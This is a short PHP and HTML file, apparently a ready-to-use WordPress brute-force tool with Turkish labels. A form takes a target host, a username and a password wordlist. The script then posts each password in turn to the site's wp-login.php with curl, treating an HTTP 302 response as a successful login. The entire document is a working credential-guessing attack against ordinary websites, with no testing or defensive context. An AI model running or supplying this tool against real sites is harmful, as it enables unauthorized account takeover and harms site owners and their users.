   <!DOCTYPE html>
<html>
<head>
    <title>    </title>
</head>
<body>
    <div>
        <form method='POST' action=''>
            <h1>Wordpress Bruteforce Script</h1>
            <input type='text' placeholder='Host' name='host'>
            <br>  
            <input type='text' placeholder='Kullanıcı Adı' name='user'>
            <br>
            <h3>Wordlist</h3>  
            <textarea name='wordlist'></textarea>
            <br>  
            <input type='submit' value='Tara' name='tara'>
            <br>  
        </form>
    </div>


</body>
</html>
<style type='text/css'>
    body {
        text-align: center;
        background-color: black;
        color: grey;
    }
    div {
        width: 60vw;
        margin: 5vh auto;
        text-align: center;
    }
    h1,h3 {
        color: white;
    }
    input {
        width: 20vw;
        height: 5vh;
        border-radius: 4px;
        margin-bottom: 1vh;
    }
    textarea {
        width: 35vw;
        height: 40vh;
    }
</style>

<?php

set_time_limit(0);
error_reporting(0);

class Wp{

        private $host;
        private $user;
        private $open;
        private $wordlist;


    public function extract_post() {
         $this->host = $_POST["host"];
         $this->user = $_POST["user"];
         $this->open = $_POST["wordlist"];
       }

       public function Xregex() {
         if(preg_match("@/wp-login.php@", $this->host)) {
             return true;
         } else {
            $this->host = $_POST["host"]."/wp-login.php";
         }
     }

      public function brute() {
           $wordlist = array_filter(explode("\n", $this->open));
           foreach($wordlist as $this->wordlist) {
           for($i=0; $i < count($this->wordlist); $i++) {
                        $this->Xcurl();
                     }
              }
       }

        private function cool() {
            echo "Host: "."<font color='white'>{$this->host}</font>";
            echo " User: "."<font color='white'>{$this->user}</font>";
            echo " Pass: "."<font color='white'>{$this->wordlist}</font>";
        }

        private function Xcurl() {
            $curl = curl_init();
            curl_setopt($curl, CURLOPT_URL, $this->host);
            curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 5);
            curl_setopt($curl, CURLOPT_POST, true);
            curl_setopt($curl, CURLOPT_POSTFIELDS, "log=$this->user&pwd=$this->wordlist&wp-submit=Login&redirect_to=$this->host/wp-admin/");
            $exec = curl_exec($curl);
            $http = curl_getinfo($curl, CURLINFO_HTTP_CODE);
            $this->cool();
            if($http == 302) {
                 echo "<font color='#00FF00'> GİRİŞ BAŞARILI</font><br>";
            } else {
                echo "<font color='red'> Giriş Başarısız</font><br>";
            }
                curl_close($curl);
        }
}

$wp = new Wp();
$wp->extract_post();
$wp->Xregex();
$wp->brute();
?>
